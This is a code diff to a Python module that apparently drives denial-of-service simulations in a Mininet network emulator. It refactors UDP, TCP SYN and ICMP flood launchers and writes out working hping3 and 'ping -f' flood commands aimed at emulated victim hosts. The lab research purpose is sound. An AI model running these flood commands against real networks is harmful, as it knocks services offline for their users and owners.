@@ -5,6 +5,7 @@ import traceback
 from colorama import Fore
 from mininet.node import Host
 from utility.my_log import information, debug, error
+from utility.host_cmd_lock import get_host_cmd_lock
 
 """
 Summary & Recommendations
@@ -198,48 +199,50 @@ def cleanup_attacker_after_dos(attacker: Host):
 
 def launch_udp_flood(attacker: Host, victim: Host, duration: int = 15):
     """
-    Launch a UDP flood attack.
+    Launch a UDP flood attack (fire-and-forget).
 
-    Uses 'timeout' so hping3 auto-terminates after `duration` seconds —
-    no polling loop, so the attacker shell stays free for the framework.
-    Same pattern as launch_tcp_syn_flood / launch_icmp_flood.
+    Starts hping3 via 'timeout {duration}s' so it auto-terminates without
+    the Python thread having to wait.  The thread returns as soon as the
+    process is confirmed running, keeping the ThreadPoolExecutor free for
+    the next scenario step.
     """
     information(Fore.RED + f"{attacker.name} launching UDP flood on {victim.name} for {duration}s\n" + Fore.WHITE)
     victim_ip = victim.IP()
 
-    if not attacker.cmd("which hping3").strip():
-        error(f"{attacker.name} does not have hping3 installed.")
-        return False
-
-    prepare_attacker_for_dos(attacker)
-
-    try:
-        # setsid detaches from the shell's process group; timeout kills hping3 automatically
-        attack_cmd = (
-            f"setsid timeout {duration}s hping3 --flood --udp {victim_ip} "
-            f">/dev/null 2>&1 &"
-        )
-        attacker.cmd(attack_cmd)
-        time.sleep(0.5)
-
-        # Single verification — no polling loop that would occupy the shell
-        pid = attacker.cmd("pgrep -f 'hping3.*flood' | head -1").strip()
-        if not pid:
-            error(Fore.RED + f"Failed to start hping3 on {attacker.name}\n" + Fore.WHITE)
+    with get_host_cmd_lock(attacker):
+        if not attacker.cmd("which hping3").strip():
+            error(f"{attacker.name} does not have hping3 installed.")
             return False
 
-        information(Fore.RED + f"hping3 started (PID {pid}) on {attacker.name}\n" + Fore.WHITE)
+        prepare_attacker_for_dos(attacker)
 
-        # Wait for the attack to run; timeout command kills hping3 automatically
-        time.sleep(duration)
-        return True
+        try:
+            # setsid detaches from the shell's process group; timeout kills hping3 automatically
+            attack_cmd = (
+                f"setsid timeout {duration}s hping3 --flood --udp {victim_ip} "
+                f">/dev/null 2>&1 &"
+            )
+            attacker.cmd(attack_cmd)
+            time.sleep(0.5)
 
-    except Exception as e:
-        error(Fore.RED + f"Exception in launch_udp_flood: {type(e).__name__}: {str(e)}\n"
-              f"{traceback.format_exc()}" + Fore.WHITE)
-        return False
-    finally:
-        cleanup_attacker_after_dos(attacker)
+            # Single verification — no polling loop that would occupy the shell
+            pid = attacker.cmd("pgrep -f 'hping3.*flood' | head -1").strip()
+            if not pid:
+                error(Fore.RED + f"Failed to start hping3 on {attacker.name}\n" + Fore.WHITE)
+                cleanup_attacker_after_dos(attacker)
+                return False
+
+            information(Fore.RED + f"hping3 started (PID {pid}) on {attacker.name}\n" + Fore.WHITE)
+            # `timeout` auto-kills hping3 after duration seconds — no cleanup thread needed.
+            # A background thread calling attacker.cmd() after duration seconds would race
+            # with the next episode's prepare_attacker_for_dos on the same host.
+            return True
+
+        except Exception as e:
+            error(Fore.RED + f"Exception in launch_udp_flood: {type(e).__name__}: {str(e)}\n"
+                  f"{traceback.format_exc()}" + Fore.WHITE)
+            cleanup_attacker_after_dos(attacker)
+            return False
 
 
 # Simpler version: Just use timeout and accept that it might stop early
@@ -316,105 +319,100 @@ def launch_udp_flood_async(attacker: Host, victim: Host, duration: int = 15):
     information(Fore.RED + f"{attacker.name} launching UDP flood on {victim.name} for duration {duration}\n" + Fore.WHITE)
     victim_ip = victim.IP()
 
-    # Ensure `hping3` is installed
-    hping_check = attacker.cmd("which hping3")
-    if not hping_check.strip():
-        msg = f"{attacker.name} does not have hping3 installed."
-        error(msg)
-        return False
-    
-    # Start hping3 in background with nohup and auto-timeout
-    attack_cmd = f"nohup timeout {duration}s hping3 --flood --udp {victim_ip} > /dev/null 2>&1 &"
-    attacker.cmd(attack_cmd)
-    
-    # Give it a moment to start
-    time.sleep(0.5)
-    
-    # Get the PID and verify it started
-    pid = attacker.cmd("pgrep -f 'hping3.*flood.*{}' | head -1".format(victim_ip)).strip()
-    
-    if not pid:
-        error(Fore.RED + f"Failed to start hping3 on {attacker.name}\n" + Fore.WHITE)
-        return False
-    
-    information(Fore.RED + f"hping3 started with PID {pid} on {attacker.name}\n" + Fore.WHITE)
-    
-    # Attack is now running in background with auto-timeout
-    # No need to monitor it - timeout will kill it automatically
-    return True
+    with get_host_cmd_lock(attacker):
+        hping_check = attacker.cmd("which hping3")
+        if not hping_check.strip():
+            error(f"{attacker.name} does not have hping3 installed.")
+            return False
+
+        attack_cmd = f"nohup timeout {duration}s hping3 --flood --udp {victim_ip} > /dev/null 2>&1 &"
+        attacker.cmd(attack_cmd)
+
+        time.sleep(0.5)
+
+        pid = attacker.cmd("pgrep -f 'hping3.*flood.*{}' | head -1".format(victim_ip)).strip()
+
+        if not pid:
+            error(Fore.RED + f"Failed to start hping3 on {attacker.name}\n" + Fore.WHITE)
+            return False
+
+        information(Fore.RED + f"hping3 started with PID {pid} on {attacker.name}\n" + Fore.WHITE)
+        return True
 
 
 def launch_tcp_syn_flood(attacker: Host, victim: Host, duration: int = 15, port: int = 80):
     """
-    TCP SYN flood attack - sends SYN packets without completing handshake.
-    More realistic than UDP flood, targets TCP services.
-    Overwhelms the victim by sending many SYN packets without completing the handshake
+    TCP SYN flood attack (fire-and-forget).
+
+    Sends SYN packets without completing the handshake.  --rand-source is
+    intentionally omitted: it requires CAP_NET_RAW with source-spoofing
+    permissions that are typically unavailable in Mininet network namespaces,
+    causing hping3 to exit immediately.  Without it the attack still generates
+    a high-volume SYN flood from the attacker's real IP.
     """
     information(Fore.RED + f"{attacker.name} launching TCP SYN flood on {victim.name}:{port}\n" + Fore.WHITE)
     victim_ip = victim.IP()
-    
-    # Check hping3
-    if not attacker.cmd("which hping3").strip():
-        error("hping3 not installed")
-        return False
-    
-    prepare_attacker_for_dos(attacker)
-    
-    try:
-        # -S = SYN flag, -p = port, --flood = max speed, --rand-source = random source IPs
-        attack_cmd = f"setsid timeout {duration}s hping3 -S -p {port} --flood --rand-source {victim_ip} >/dev/null 2>&1 &"
-        attacker.cmd(attack_cmd)
-        
-        time.sleep(0.5)
-        pid = attacker.cmd("pgrep -f 'hping3.*-S' | head -1").strip()
-        
-        if not pid:
-            error("Failed to start SYN flood")
+
+    with get_host_cmd_lock(attacker):
+        if not attacker.cmd("which hping3").strip():
+            error("hping3 not installed")
             return False
-        
-        information(f"TCP SYN flood started with PID {pid}")
-        time.sleep(duration)
-        attacker.cmd("killall -9 hping3 2>/dev/null")
-        
-        information(Fore.YELLOW + f"SYN flood stopped\n" + Fore.WHITE)
-        return True
-        
-    finally:
-        cleanup_attacker_after_dos(attacker)
+
+        prepare_attacker_for_dos(attacker)
+
+        try:
+            attack_cmd = f"setsid timeout {duration}s hping3 -S -p {port} --flood {victim_ip} >/dev/null 2>&1 &"
+            attacker.cmd(attack_cmd)
+
+            time.sleep(0.5)
+            pid = attacker.cmd("pgrep -f 'hping3.*-S' | head -1").strip()
+
+            if not pid:
+                error("Failed to start SYN flood")
+                cleanup_attacker_after_dos(attacker)
+                return False
+
+            information(f"TCP SYN flood started with PID {pid}")
+            return True
+
+        except Exception as e:
+            error(f"Exception in launch_tcp_syn_flood: {e}")
+            cleanup_attacker_after_dos(attacker)
+            return False
 
 
 def launch_icmp_flood(attacker: Host, victim: Host, duration: int = 15):
     """
-    ICMP flood (ping flood) - overwhelms with ping requests.
-    Simpler than UDP/TCP, uses standard ping command.
-    Classic ping flood - simple but effective.
+    ICMP flood / ping flood (fire-and-forget).
+
+    Uses `ping -f` with maximum packet size.  Returns as soon as the process
+    is confirmed running; `timeout {duration}s` terminates ping automatically.
     """
     information(Fore.RED + f"{attacker.name} launching ICMP flood on {victim.name}\n" + Fore.WHITE)
     victim_ip = victim.IP()
-    
-    prepare_attacker_for_dos(attacker)
-    
-    try:
-        # -f = flood mode, -s = packet size
-        attack_cmd = f"setsid timeout {duration}s ping -f -s 65507 {victim_ip} >/dev/null 2>&1 &"
-        attacker.cmd(attack_cmd)
-        
-        time.sleep(0.5)
-        pid = attacker.cmd("pgrep -f 'ping.*-f' | head -1").strip()
-        
-        if not pid:
-            error("Failed to start ICMP flood")
+
+    with get_host_cmd_lock(attacker):
+        prepare_attacker_for_dos(attacker)
+
+        try:
+            attack_cmd = f"setsid timeout {duration}s ping -f -s 65507 {victim_ip} >/dev/null 2>&1 &"
+            attacker.cmd(attack_cmd)
+
+            time.sleep(0.5)
+            pid = attacker.cmd("pgrep -f 'ping.*-f' | head -1").strip()
+
+            if not pid:
+                error("Failed to start ICMP flood")
+                cleanup_attacker_after_dos(attacker)
+                return False
+
+            information(f"ICMP flood started with PID {pid}")
+            return True
+
+        except Exception as e:
+            error(f"Exception in launch_icmp_flood: {e}")
+            cleanup_attacker_after_dos(attacker)
             return False
-        
-        information(f"ICMP flood started with PID {pid}")
-        time.sleep(duration)
-        attacker.cmd("killall -9 ping 2>/dev/null")
-        
-        information(Fore.YELLOW + f"ICMP flood stopped\n" + Fore.WHITE)
-        return True
-        
-    finally:
-        cleanup_attacker_after_dos(attacker)
 
 def launch_http_flood(attacker: Host, victim: Host, duration: int = 15, port: int = 80):
     """
